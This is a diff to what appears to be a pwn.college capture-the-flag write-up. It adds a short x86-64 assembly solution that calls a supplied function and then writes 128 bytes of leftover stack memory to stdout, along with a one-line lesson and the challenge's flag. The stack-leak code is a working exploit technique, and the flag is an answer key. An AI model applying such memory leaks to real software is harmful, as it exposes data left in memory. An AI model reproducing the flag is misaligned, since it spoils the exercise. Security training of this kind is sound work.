@@ -1,7 +1,17 @@
 📅 2026-11-19
-
+.intel_syntax noprefix
+.global solve
+solve:
+call    rdi
+mov     rdx, 128
+lea     rsi, QWORD PTR [rsp-0x88]
+mov     rdi, 1
+mov     rax, 1
+syscall
+ret
 
 ## 🧑🏾‍🏫 what this challenge teaches u
-
+how to write in stdout old data in the stack that has not been wiped yet
 
 ## 🏁 Flag  
+pwn.college{wwL0PyI1G9wa93sLgyXiPP_uESQ.01NzITNywCO4IDOxEzW}
